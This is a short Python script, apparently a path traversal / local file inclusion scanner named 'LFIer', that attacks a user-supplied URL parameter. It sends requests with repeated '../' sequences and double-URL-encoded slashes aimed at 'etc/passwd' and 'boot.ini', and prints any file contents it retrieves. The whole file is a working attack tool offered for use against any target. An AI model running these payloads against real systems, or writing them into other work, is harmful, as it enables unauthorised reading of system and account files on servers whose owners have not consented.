import requests
import optparse
from termcolor import colored

def banner():
    print(colored(''' 
    _     _____ ___          
    | |   |  ___|_ _|___ _ __ 
    | |   | |_   | |/ _ \ '__|
    | |___|  _|  | |  __/ |   
    |_____|_|   |___\___|_|   
    by Mohamed Sayed @kanike99             
    ''', 'green'))


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option('-u', '--url', dest='url', help='URL to Attack')
    parser.add_option('-p', '--parameter', dest='parameter', help='Parameter to Attack')
    (options, arguments) = parser.parse_args()

    if not options.url:
        parser.error(colored("[-] Please Provide target url, use --help for more information", 'red'))
    if not options.parameter:
        parser.error(colored("[-] Please Provide parameter to attack, use --help for more information", 'red'))

    return options

def attack():
    args = get_arguments() # options
    url = args.url # the url will be like: -u http://testphp.vulnweb.com/showimage.php
    parameter = args.parameter # the parameter will be like: -p file

    payloads_andVulnkeywords = {"etc/passwd": "root", "boot.ini": "[boot loader]"}
    up = "../"

    for (payload, Vulnkeyword) in payloads_andVulnkeywords.items():
        for i in range(0,5): # iterate through 0-5

            # ../etc/passwd  ../../etc/passd  etc
            iteration_payload = i*up + payload 

            r = requests.get(url, params={parameter: iteration_payload})
            if Vulnkeyword in r.text:
                print(colored("Vulnerable!!!", "red", attrs=['bold']))
                print(colored(f"{r.url}", "blue"))
                print(colored(f"payload --> {iteration_payload}", "blue"))
                print(r.text)
            else:
                # double url-encode the slash
                iteration_payload = iteration_payload.replace("/", "%252f")
                r = requests.get(url, params={parameter: iteration_payload})
                if Vulnkeyword in r.text:
                    print(colored("Vulnerable!!!", "red", attrs=['bold']))
                    print(colored(f"{r.url}", "blue"))
                    print(colored(f"payload --> {iteration_payload}", "blue"))
                    print(r.text)

banner()
attack()